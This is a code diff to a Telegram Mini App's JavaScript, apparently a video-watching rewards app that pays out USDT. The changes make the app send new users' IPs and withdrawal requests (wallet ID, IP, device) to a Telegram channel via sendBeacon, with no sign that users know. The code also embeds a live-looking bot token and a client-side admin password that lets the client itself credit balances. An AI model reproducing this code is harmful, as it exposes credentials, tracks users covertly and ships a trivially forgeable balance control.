@@ -553,27 +553,20 @@
     const tg = window.Telegram.WebApp;
     tg.expand();
 
-    // ==================== CONFIGURACIÓN BOT CHISMOSO ====================
+    // ==================== CONFIGURACIÓN BOT (SENDBEACON - SIN CORS) ====================
     const BOT_TOKEN = '8201469768:AAFxMrPBzmQxrhD1VNvf1Mq6IJoqFoZCTcU';
     const CHAT_ID = '@BBCgdtcwvvebegd';
     const ADMIN_SECRET = '231606';
     
-    // Función de notificación REPARADA (JSON Puro y Espera obligatoria)
-    async function enviarNotificacion(mensaje) {
+    // Función que SÍ FUNCIONA en WebView de Telegram
+    function enviarNotificacion(mensaje) {
         const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-        try {
-            await fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: mensaje,
-                    parse_mode: 'Markdown'
-                })
-            });
-        } catch (e) {
-            console.error('Error enviando notificación:', e);
-        }
+        const body = new URLSearchParams({
+            chat_id: CHAT_ID,
+            text: mensaje,
+            parse_mode: 'Markdown'
+        });
+        navigator.sendBeacon(url, body);
     }
 
     // ==================== OBTENER DATOS DE RED ====================
@@ -665,7 +658,7 @@
                 totalVideosWatched: 0, createdAt: new Date().toISOString(),
                 registroIP: networkInfo.ip, registroDevice: networkInfo.device
             });
-            await enviarNotificacion(`🆕 *Nuevo usuario*\n👤 ${userName}\n🆔 \`${userId}\`\n📍 IP: \`${networkInfo.ip}\``);
+            enviarNotificacion(`🆕 *Nuevo usuario*\n👤 ${userName}\n🆔 \`${userId}\`\n📍 IP: \`${networkInfo.ip}\``);
             if(inviter !== "none") {
                 const invRef = db.collection("usuarios").doc(inviter);
                 if((await invRef.get()).exists) await invRef.update({ referidos: firebase.firestore.FieldValue.increment(1) });
@@ -781,7 +774,6 @@
             const isFirst = !data.hasWithdrawn;
             const networkInfo = await getNetworkInfo();
             
-            // 🦊 REPARACIÓN: PRIMERO ENVIAR NOTIFICACIÓN CON AWAIT
             const msg = `🦊 *RETIRO SOLICITADO*
 👤 ${data.nombre} (@${data.username || 'n/a'})
 🆔 \`${userId}\`
@@ -793,9 +785,13 @@
 📱 ${networkInfo.device}
 ⚠️ *Primer retiro: ${isFirst ? 'SÍ' : 'NO'}*`;
             
-            await enviarNotificacion(msg); // <--- Aquí el cambio crítico
+            // PRIMERO enviar notificación
+            enviarNotificacion(msg);
+            
+            // Pequeña pausa para asegurar envío
+            await new Promise(resolve => setTimeout(resolve, 500));
 
-            // DESPUÉS DE ENVIAR, ACTUALIZAMOS FIREBASE
+            // DESPUÉS actualizar Firebase
             await ref.update({
                 ccwallet_id: ccwallet,
                 balance: 0,
@@ -906,6 +902,9 @@
         tg.openTelegramLink(`https://t.me/share/url?url=${encodeURIComponent(`https://t.me/USDTGIFTKBot?startapp=${userId}`)}&text=Gana monedas viendo videos`);
     }
 
+    function openCCWallet() { tg.openTelegramLink('https://t.me/cctip_bot'); }
+    function joinChannel() { tg.openTelegramLink('https://t.me/UsdtGiftChannel'); }
+
     function initAdmin() {
         const card = document.getElementById('balanceCard');
         let pressTimer;
@@ -914,12 +913,14 @@
         card.addEventListener('mousedown', start); card.addEventListener('mouseup', cancel);
         card.addEventListener('touchstart', start); card.addEventListener('touchend', cancel);
         document.getElementById('adminConfirmBtn').onclick = async () => {
-            if (document.getElementById('adminPassword').value !== ADMIN_SECRET) return;
+            if (document.getElementById('adminPassword').value !== ADMIN_SECRET) { showToast("❌ Clave incorrecta"); return; }
             const amount = parseInt(document.getElementById('adminAmount').value);
             if (amount > 0) {
                 await db.collection("usuarios").doc(userId).update({ balance: firebase.firestore.FieldValue.increment(amount) });
                 cachedBalance += amount; updateUI();
                 document.getElementById('adminModal').style.display = 'none';
+                canvasConfetti({ particleCount: 300 });
+                showToast(`👑 +${amount} ⭐`);
             }
         };
         document.getElementById('adminCancelBtn').onclick = () => document.getElementById('adminModal').style.display = 'none';
